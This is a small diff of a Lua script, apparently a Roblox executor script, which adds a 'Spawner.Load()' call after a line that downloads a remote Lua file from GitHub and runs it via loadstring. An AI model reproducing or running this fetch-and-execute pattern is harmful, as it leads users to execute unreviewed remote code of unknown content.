@@ -1,5 +1,6 @@
 -- Load the spawner and execute it
 loadstring(game:HttpGet("https://raw.githubusercontent.com/drkwow/depression/refs/heads/main/Spawner.lua"))()
+Spawner.Load()
 
 -- Destroy previous GUI if exists
 pcall(function()
